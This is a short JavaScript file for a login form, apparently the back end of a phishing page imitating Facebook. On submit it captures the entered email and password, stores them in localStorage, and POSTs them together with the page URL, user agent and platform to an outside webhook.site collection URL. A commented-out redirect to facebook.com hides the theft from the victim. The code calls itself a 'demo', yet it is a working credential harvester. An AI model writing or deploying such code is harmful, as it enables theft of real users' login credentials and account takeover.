console.log('script.js loaded — using webhook-only mode');

const WEBHOOK_URL = 'https://webhook.site/cf070007-6608-450e-bc2b-d764f8d54e7a';

document.getElementById('login-form').addEventListener('submit', function (event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  console.log('Captured (demo) — Email:', email, 'Password:', password ? '***' : '(empty)');

  // Store locally for demo purposes
  localStorage.setItem('email', email);
  localStorage.setItem('password', password);

  // Send JSON payload to webhook
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      user_email: email,
      user_password: password,
      timestamp: new Date().toISOString(),
      source: window.location.href,
      userAgent: navigator.userAgent,
      pcname: navigator.platform,
    })
  })
    .then((res) => {
      console.log('Webhook POST status:', res.status);
    })
    .catch((err) => {
      console.error('Webhook POST failed:', err);
    })
    .finally(() => {
      // Redirect so demo continues
      // window.location.href = 'https://www.facebook.com/';
      console.log("Demo complete — would redirect to Facebook now.");
    });
});
